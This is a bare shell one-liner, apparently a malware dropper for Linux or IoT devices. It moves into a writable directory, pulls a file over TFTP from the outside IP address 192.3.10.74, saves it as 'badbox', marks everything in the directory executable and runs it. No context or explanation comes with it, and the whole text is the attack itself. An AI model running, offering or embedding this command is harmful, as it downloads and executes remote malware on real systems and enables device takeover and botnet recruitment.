cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 192.3.10.74;cat wget >badbox;chmod +x *;./badbox
